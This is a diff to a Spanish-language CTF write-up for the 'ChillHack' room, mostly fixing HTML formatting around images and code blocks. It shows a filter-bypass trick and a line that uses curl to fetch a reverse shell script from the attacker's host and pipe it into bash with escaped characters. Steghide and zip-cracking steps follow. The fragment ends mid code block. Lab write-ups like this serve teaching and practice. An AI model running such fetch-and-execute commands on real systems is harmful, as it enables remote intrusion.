@@ -78,7 +78,7 @@ Hemos hecho un bypass del comando `ls -la` escapando la s, por lo que podemos ll
     </td>
     <td style="vertical-align:top;">
       <div style="text-align:center;">
-        <img src="../assets/images/Rooms/ChillHack/image 10_2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px>
+        <img src="../assets/images/Rooms/ChillHack/image 10_2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px">
       </div>
     </td>
   </tr>
@@ -91,13 +91,11 @@ Por lo que, podemos intentar ejecutar una <em>reverse shell</em> desde la págin
 </div>
 
 Ahora, en la web vamos a ejecutar el comando:
-<div style="text-align:center;">
 
 <div style="text-align: center;">
   <pre><code>curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
 </div>
 
-</div>
 para poder obtener la *reverse shell* y seguido ejecutarla escapando el comando `bash`.
 
 <table style="text-align:center">
@@ -188,12 +186,13 @@ y vemos que tenemos un directorio llamado `/images`, si accedemos a él encontra
 </div>
 
 Ahora nos descargamos el archivo:
-<div style="text-align:center;">
 
-```bash
+<div style="text-align:center;">
+  <pre><code>
 wget hacker-with-laptop_23-2147985341.jpg
-```
+  </code></pre>
 </div>
+
 Como tenemos una imagen con extensión '.jpg' podemos hacer uso de `steghide` para poder encontrar información oculta en la imagen:
 <div style="text-align:center;">
   <img src="../assets/images/Rooms/ChillHack/image 29.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px">
@@ -202,6 +201,7 @@ Y esto no da un archivo llamado 'backup.zip', el cual si queremos descomprimir n
 <div style="text-align:center;">
   <img src="../assets/images/Rooms/ChillHack/image 30.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px">
 </div>
+
 Tenemos la contraseña del '.zip', vamos a abrirlo:
 <div style="text-align:center;">
 <pre><code>unzip backup.zip
